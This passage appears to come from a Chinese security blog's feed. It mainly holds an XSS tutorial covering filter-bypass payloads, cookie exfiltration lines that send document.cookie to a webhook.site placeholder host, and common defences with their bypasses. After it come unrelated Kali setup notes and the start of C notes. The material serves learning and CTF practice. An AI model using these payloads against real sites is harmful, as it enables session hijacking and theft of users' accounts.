-<h4 id="map-方法"><a href="#map-方法" class="headerlink" title="map()方法"></a>map()方法</h4><p>用于对数组中的每个元素执行提供的回调函数，并返回一个新的数组，新的数组包含回调函数的返回值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array.map(callback(currentValue, index, array))</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数</strong>：</p>
-<ul>
-<li><code>callback</code>：对每个数组元素执行的函数</li>
-<li><code>currentValue</code>：当前处理的元素</li>
-<li><code>index</code>（可选）：当前处理的元素的索引</li>
-<li><code>array</code>（可选）：调用 <code>map()</code> 方法的数组</li>
-</ul>
-</blockquote>
-<p>最后一个payload解释：</p>
-<p><code>[&#39;ale&#39;+&#39;rt&#39;]</code> 是一个包含字符串 <code>&#39;alert&#39;</code> 的数组</p>
-<p><code>map(top[&#39;ev&#39;+&#39;al&#39;])</code> 使用 <code>map()</code> 方法对该数组进行操作，最终将 <code>alert</code> 函数赋值给数组的第一个元素</p>
-<p><code>[0]</code> 取出数组的第一个元素，即 <code>alert</code> 函数</p>
-<p><code>valueOf()</code> 获取该函数的原始值（即 <code>alert</code> 函数本身）</p>
-<p>最后，调用 <code>alert(1)</code> 执行 JavaScript 代码</p>
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p><code>&lt;</code>被编码为<code>%3C</code>，<code>&gt;</code>被编码为<code>%3E</code>，<code>&amp;</code>被编码为<code>%26</code>，<code>/</code>被编码为<code>%2F</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%3Cscript%3Ealert(1)%3C%2Fscript%3E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h4><p>是将某些特殊字符转换成以 <code>&amp;</code> 开头、<code>;</code> 结尾的实体格式</p>
-<p><code>&lt;</code>被编码为<code>&amp;lt;</code>，<code>&gt;</code>被编码为<code>&amp;gt;</code>，<code>&amp;</code>被编码为<code>&amp;amp;</code>，<code>/</code>被编码为<code>&amp;#47;</code>，<code>“</code>被编码为<code>&amp;quot;</code>，<code>’</code>被编码为<code>&amp;apos;</code>，<code> </code>被编码为<code>&amp;nbsp;</code>，<code>=</code>被编码为<code>&amp;#61;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>alert(1)</code>编码为<code>atob(&#39;YWxlcnQoMSk=&#39;)</code></p>
-<h4 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a>双重编码</h4><p>例如，先对 <code>&lt;</code> 编码为 <code>%3C</code>，再将<code>%3C</code>编码为 <code>%253C</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%253Cscript%253Ealert(1)%253C%252Fscript%253E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h4><p>Unicode 编码使用十六进制值表示字符，它可以用于替代常见的 ASCII 字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>97,108,101,114,116,40,49,41</code>是 <code>alert(1)</code> 每个字符的 Unicode 编码值</p>
-<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29))&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20</p>
-<p>B位置：%09，%0A，%0C，%0D，%20</p>
-<p>C位置：%0B，&#x2F;**&#x2F; （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p>
-<p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="()绕过"></a>()绕过</h3><h4 id="使用反引号"><a href="#使用反引号" class="headerlink" title="使用反引号"></a>使用反引号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>onload</code>：当 SVG 元素及其资源加载完成后触发。事件触发时会执行后面的 JavaScript 代码</p>
-<p><code>window.onerror = eval;</code>：<code>window.onerror</code> 是一个全局的错误处理函数，当 JavaScript 执行时发生错误，它会被调用。通过将其设置为 <code>eval</code>，攻击者可以劫持错误处理并执行恶意的 JavaScript 代码</p>
-<p><code>throw &#39;=alert\x281\x29&#39;;</code>：这行代码通过 <code>throw</code> 抛出一个异常<code>alert(1)</code></p>
-<h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><h4 id="使用反引号-1"><a href="#使用反引号-1" class="headerlink" title="使用反引号"></a>使用反引号</h4><h4 id="用斜杠替换"><a href="#用斜杠替换" class="headerlink" title="用斜杠替换"></a>用斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="alert过滤绕过"><a href="#alert过滤绕过" class="headerlink" title="alert过滤绕过"></a>alert过滤绕过</h3><h4 id="函数替换绕过-1"><a href="#函数替换绕过-1" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><p><code>prompt()</code>，<code>confirm()</code>，<code>console.log()</code>，<code>document.write()</code></p>
-<h4 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h4><h4 id="对象方法绕过"><a href="#对象方法绕过" class="headerlink" title="对象方法绕过"></a>对象方法绕过</h4><p>利用对象的属性或方法来替代直接调用 <code>alert</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window.constructor.constructor(&#x27;alert(1)&#x27;)()&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="数组方法绕过"><a href="#数组方法绕过" class="headerlink" title="数组方法绕过"></a>数组方法绕过</h4><h4 id="异步调用绕过"><a href="#异步调用绕过" class="headerlink" title="异步调用绕过"></a>异步调用绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(&#x27;alert(1)&#x27;, 0)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="字符替换绕过"><a href="#字符替换绕过" class="headerlink" title="字符替换绕过"></a>字符替换绕过</h4><h4 id="分割关键字绕过"><a href="#分割关键字绕过" class="headerlink" title="分割关键字绕过"></a>分割关键字绕过</h4><p>通过在关键字中插入空格或注释符号（ <code>/**/</code>）来分隔函数名</p>
-<p><code>a/**/l/**/ert(1)</code></p>
-<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><h4 id="用拆分法"><a href="#用拆分法" class="headerlink" title="用拆分法"></a>用拆分法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;hack&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="用嵌套结构"><a href="#用嵌套结构" class="headerlink" title="用嵌套结构"></a>用嵌套结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(&#x27;&lt;img src=1 onerror=alert(1)&gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h3><p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当浏览器遇到 <code>throw 1</code> 时，它会抛出一个错误</p>
-<p>抛出错误时，<code>onerror</code> 事件会被触发，因为我们之前将 <code>onerror</code> 设置为了 <code>alert</code> 函数</p>
-<p>结果是，浏览器会弹出一个对话框，显示 <code>1</code>，这就是 <code>alert(1)</code> 的效果</p>
-<h3 id="绕过CSP（未完）"><a href="#绕过CSP（未完）" class="headerlink" title="绕过CSP（未完）"></a>绕过CSP（未完）</h3><h3 id="绕过WAF（未完）"><a href="#绕过WAF（未完）" class="headerlink" title="绕过WAF（未完）"></a>绕过WAF（未完）</h3><h2 id="cookie外带"><a href="#cookie外带" class="headerlink" title="cookie外带"></a>cookie外带</h2><p>XSS靶场中通常以<strong>前端检测网页是否弹窗</strong>来判断有没有被XSS，但比赛&#x2F;实战中，通常以XSS真实场景，需要外带出Cookie</p>
-<h3 id="获取cookie（待定）"><a href="#获取cookie（待定）" class="headerlink" title="获取cookie（待定）"></a>获取cookie（待定）</h3><h3 id="带出cookie（通常对-进行编码-2B）"><a href="#带出cookie（通常对-进行编码-2B）" class="headerlink" title="带出cookie（通常对+进行编码%2B）"></a>带出cookie（通常对+进行编码%2B）</h3><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a><code>fetch()</code>方法</h4><p><code>fetch()</code> 允许 JavaScript 发送 HTTP 请求。如果 <code>credentials: &#39;include&#39;</code>，则可以携带当前站点的 Cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
-
-<h4 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a><code>XMLHttpRequest</code> 对象</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="window-location-对象"><a href="#window-location-对象" class="headerlink" title="window.location 对象"></a><code>window.location</code> 对象</h4><p><code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong></p>
-<h5 id="window-location-href"><a href="#window-location-href" class="headerlink" title="window.location.href"></a><code>window.location.href</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
-
-<h5 id="window-location-assign-url"><a href="#window-location-assign-url" class="headerlink" title="window.location.assign(url)"></a><code>window.location.assign(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
-
-<h5 id="window-location-replace-url"><a href="#window-location-replace-url" class="headerlink" title="window.location.replace(url)"></a><code>window.location.replace(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
-
-<h4 id="window-open方法"><a href="#window-open方法" class="headerlink" title="window.open方法"></a><code>window.open</code>方法</h4><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象</p>
-<p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
-
-<h4 id="document-write方法"><a href="#document-write方法" class="headerlink" title="document.write方法"></a><code>document.write</code>方法</h4><p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h2><h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>设置 Cookie 为 HttpOnly，这样，JavaScript 无法 通过 <code>document.cookie</code> 访问该 Cookie，只能通过HTTP请求发送给服务器</p>
-<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CSRF (跨站请求伪造)</td>
-<td>HttpOnly 不能防止跨站请求伪造攻击（CSRF），攻击者仍可在受害者的浏览器中发起请求，利用受害者的 Cookie 进行操作</td>
-</tr>
-<tr>
-<td>XS-Leaks（跨站信息泄露）</td>
-<td>通过 <code>img</code>、<code>iframe</code>、<code>fetch()</code> 发送请求，并观察返回数据是否有差异，可能间接推测出 Cookie 值</td>
-</tr>
-<tr>
-<td>服务器端获取 Cookie</td>
-<td>通过 XSS <strong>劫持会话</strong>，让受害者访问恶意页面，然后<strong>读取本地存储的 Token</strong> 或 <strong>触发服务器端请求</strong> 来利用 Cookie</td>
-</tr>
-</tbody></table>
-<h3 id="输入验证和转义"><a href="#输入验证和转义" class="headerlink" title="输入验证和转义"></a>输入验证和转义</h3><p>输入验证：限制输入字符，只允许安全字符（如 <code>a-zA-Z0-9</code>）</p>
-<p>HTML转义：实体编码</p>
-<p>防止恶意脚本被注入到网页中</p>
-<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>双重编码绕过</td>
-<td>有些 WAF 只转义了一次，可以尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 让服务器误解</td>
-</tr>
-<tr>
-<td>事件属性绕过</td>
-<td>如果 <code>&lt;script&gt;</code> 被拦截，可以尝试 <code>&lt;img src=x onerror=alert(1)&gt;</code></td>
-</tr>
-<tr>
-<td>DOM XSS</td>
-<td>如果后端转义了，但前端用 <code>innerHTML</code> 渲染数据，仍然可以执行 XSS 代码</td>
-</tr>
-<tr>
-<td>JSON 解析漏洞</td>
-<td>JSON 可能会反序列化恶意代码，例如 <code>&#123;&quot;data&quot;: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&#125;</code></td>
-</tr>
-</tbody></table>
-<h3 id="使用-CSP（内容安全策略）"><a href="#使用-CSP（内容安全策略）" class="headerlink" title="使用 CSP（内容安全策略）"></a>使用 CSP（内容安全策略）</h3><p>限制页面中允许执行的脚本来源，防止外部 XSS 代码注入</p>
-<h4 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h4><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>JSONP 绕过</td>
-<td>某些 API 允许 <code>JSONP</code> 请求，仍可执行外部代码</td>
-</tr>
-<tr>
-<td>内联事件监听</td>
-<td><code>onclick=&quot;alert(1)&quot;</code> 可能仍然有效</td>
-</tr>
-<tr>
-<td>数据 URI 绕过</td>
-<td>某些 <code>data:</code> 方案仍然可以执行代码</td>
-</tr>
-<tr>
-<td>动态 JavaScript 执行</td>
-<td><code>eval()</code>, <code>setTimeout()</code>, <code>Function()</code> 可能仍然可以执行恶意代码</td>
-</tr>
-</tbody></table>
-<h3 id="Cookie-SameSite-属性"><a href="#Cookie-SameSite-属性" class="headerlink" title="Cookie SameSite 属性"></a>Cookie SameSite 属性</h3><p>限制 Cookie 的跨站点发送行为</p>
-<h4 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h4><table>
-<thead>
-<tr>
-<th>绕过方式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CORS 配合 XSS 绕过</td>
-<td>如果 <code>Access-Control-Allow-Origin: *</code>，可以用 <code>fetch()</code> 请求获取敏感数据</td>
-</tr>
-<tr>
-<td>站内跳转绕过</td>
-<td><code>SameSite=Lax</code> 允许 GET 请求，所以可以诱导用户点击链接</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>参考文章：</p>
-<p><a href="https://xz.aliyun.com/news/11816">对于XSS跨站脚本攻击的学习-先知社区</a></p>
-<p><a href="https://j0k3r.top/2019/11/19/csp-bypass/#2-%E4%BD%BF%E7%94%A8-CSP">前端安全之 CSP 及其常见绕过</a></p>
-<p><a href="https://buuoj.cn/challenges#XSS-Lab">BUUCTF上的XSS靶场</a></p>
-</blockquote>
-</div>]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>kali优化</title>
-    <url>/2025/02/05/kali%E4%BC%98%E5%8C%96/</url>
-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="kali优化"><a href="#kali优化" class="headerlink" title="kali优化"></a>kali优化</h1><p><strong>kali解压打开默认密码为：kali</strong></p>
-<h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h2><p>打开Terminal，输入命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
-
-<p>进入后使用键盘的↑+↓←，到最底部，找到 <code>[ ] zh_CN.UTF-8 UTF-8</code> ，按空格键选中，再按回车进入下一个页面，再选中 <code>zh_CN.UTF-8</code>作为默认语言，后回车</p>
-<p>等待下载结束后重启即可</p>
-<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a><strong>换源</strong></h2><p>因为官方源都是的速度慢，所以选择换国内源</p>
-<p>打开Terminal，输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-
-<p>可选的国内源</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-
-<p>不懂vim语法的按以下步骤来</p>
-<ol>
-<li><p>全选删除原本的内容</p>
-<p> 按<strong>esc键</strong>后，先按 <strong>g g</strong>（到达顶部），然后再按 <strong>d G</strong>(区分大小写！！！)</p>
-</li>
-<li><p>复制以上内容，右键粘贴</p>
-</li>
-<li><p>保存退出</p>
-<p> 按<strong>esc键</strong>后，同时按住<strong>shift</strong>键和英文:键，再输入wq</p>
-</li>
-</ol>
-<h2 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a><strong>系统优化</strong></h2><h3 id="1-设置root账户密码"><a href="#1-设置root账户密码" class="headerlink" title="1.设置root账户密码"></a>1.设置root账户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-设置禁止休眠"><a href="#2-设置禁止休眠" class="headerlink" title="2.设置禁止休眠"></a>2.设置禁止休眠</h3><ul>
-<li>打开左上角kali图标</li>
-<li>点击<code>settings(设置)</code></li>
-<li>点击进入<code>power Manger(电源管理器)</code></li>
-<li>在<code>Power Manager</code> 选择—&gt; <code>display(显示)</code><br>  把使用电池和插入电源下的依次把<code>Blank after、Put to sleep after和Switch off after</code> 全部设置成为 <code>Never</code></li>
-</ul>
-<h3 id="3-软件数据库更新："><a href="#3-软件数据库更新：" class="headerlink" title="3.软件数据库更新："></a>3.软件数据库更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-软件更新："><a href="#4-软件更新：" class="headerlink" title="4.软件更新："></a>4.软件更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-系统更新："><a href="#5-系统更新：" class="headerlink" title="5.系统更新："></a>5.系统更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a><u><strong>安装中文输入法</strong></u></h2><ol>
-<li><p>更新包管理器的软件包列表：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>安装<code>fcitx</code>输入法框架：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>安装<code>fcitx-googlepinyin</code>谷歌拼音输入法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><code>ctrl</code>+<code>space(空格)</code>切换输入法</p>
-<h2 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a><strong>界面美化</strong></h2><h3 id="1-整体字体放大"><a href="#1-整体字体放大" class="headerlink" title="1.整体字体放大"></a>1.整体字体放大</h3><ul>
-<li>打开左上角kali图标</li>
-<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
-<li>选择<strong>字体</strong>，修改<strong>DPI</strong></li>
-</ul>
-<h3 id="1-桌面图标大小"><a href="#1-桌面图标大小" class="headerlink" title="1.桌面图标大小"></a>1.桌面图标大小</h3><ul>
-<li>桌面<strong>右键</strong>选择<strong>桌面设置</strong></li>
-<li>选择<strong>图标</strong>，调节<strong>图标大小</strong>完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）</li>
-</ul>
-<h3 id="2-菜单栏大小以及位置"><a href="#2-菜单栏大小以及位置" class="headerlink" title="2.菜单栏大小以及位置"></a>2.菜单栏大小以及位置</h3><ul>
-<li>在菜单栏空白处右键—选择<strong>面板</strong>再点击<strong>面板首选项</strong></li>
-<li>打开面板后选择<strong>显示</strong>—<strong>尺寸</strong>—调节<strong>行大小</strong></li>
-<li><strong>关闭锁定面板</strong>，可拖动作用两侧的小点将面板放置于最下侧</li>
-</ul>
-<h3 id="3-终端字体"><a href="#3-终端字体" class="headerlink" title="3.终端字体"></a>3.终端字体</h3><ul>
-<li>打开<strong>终端</strong>再点击左上角<strong>文件</strong>点击<strong>参数设置</strong></li>
-<li>打开<strong>设置界面</strong>，<strong>界面设置</strong>—调节<strong>字体</strong>大小</li>
-</ul>
-<h3 id="4-系统字体"><a href="#4-系统字体" class="headerlink" title="4.系统字体"></a>4.系统字体</h3><ul>
-<li>打开左上角kali图标</li>
-<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
-<li>选择<strong>字体</strong>，修改<strong>默认字体</strong>和<strong>默认等宽字体</strong></li>
-</ul>
-<h3 id="4-窗口字体"><a href="#4-窗口字体" class="headerlink" title="4.窗口字体"></a>4.窗口字体</h3><ul>
-<li>打开左上角kali图标</li>
-<li>点击<strong>设置</strong>进入<strong>窗口管理器</strong></li>
-<li>选择<strong>样式</strong>修改<strong>标题字体</strong></li>
-</ul>
-<h2 id="kali-mysql登录问题"><a href="#kali-mysql登录问题" class="headerlink" title="kali mysql登录问题"></a>kali mysql登录问题</h2><p>不知用户名和密码（用root试过不行），我们自行更改root用户的密码</p>
-<p>使用 <strong><code>sudo</code></strong> 登录 MySQL：<code>sudo mysql</code></p>
-<p>确定数据库版本</p>
-<p><code>SELECT VERSION();</code></p>
-<p><strong>MariaDB版本</strong></p>
-<p>使用以下 SQL 语法来修改 <code>root</code> 用户的密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET PASSWORD FOR &#x27;root&#x27;@&#x27;localhost&#x27; = PASSWORD(&#x27;your_new_password&#x27;);</span><br><span class="line">或 </span><br><span class="line">UPDATE mysql.user SET password = PASSWORD(&#x27;your_new_password&#x27;) WHERE user = &#x27;root&#x27; AND host = &#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>MySQL版本</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;your_new_password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>刷新权限</p>
-<p><code>FLUSH PRIVILEGES;</code></p>
-<p>如果以上方法仍然不起作用，可能是由于权限问题。可以检查 <code>root</code> 用户的权限配置：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT user, host, authentication_string, plugin FROM mysql.user WHERE user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>确认 <code>root</code> 用户是否具有正确的权限，并且插件是否配置为 **<code>mysql_native_password</code>**，或者可以通过 <strong><code>unix_socket</code></strong> 来进行身份验证</p>
-<p>0.0.0.0</p>
-</div>]]></content>
-      <categories>
-        <category>kali虚拟机</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>C语言</title>
-    <url>/2025/02/05/C%E8%AF%AD%E8%A8%80/</url>
-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="C语言易错难懂知识"><a href="#C语言易错难懂知识" class="headerlink" title="C语言易错难懂知识"></a>C语言易错难懂知识</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p>1.进制</p>
-<p>二进制：0b开头</p>
-<p>八进制：0开头</p>
